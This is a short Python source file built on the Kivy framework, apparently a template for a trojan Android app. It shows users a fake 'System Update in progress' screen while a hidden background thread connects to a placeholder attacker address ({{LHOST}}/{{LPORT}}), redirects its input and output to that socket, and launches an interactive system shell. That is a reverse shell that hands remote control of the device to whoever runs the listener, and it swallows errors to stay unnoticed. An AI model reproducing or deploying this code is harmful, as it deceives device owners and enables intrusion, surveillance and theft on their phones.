import socket
import subprocess
import os
import threading
from kivy.app import App
from kivy.uix.label import Label

class SystemUpdateApp(App):
    def build(self):
        threading.Thread(target=self.connect_c2, daemon=True).start()
        return Label(text='System Update in progress...\nPlease wait.')

    def connect_c2(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{{LHOST}}", int("{{LPORT}}")))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/system/bin/sh", "-i"])
        except Exception:
            pass

if __name__ == '__main__':
    SystemUpdateApp().run()
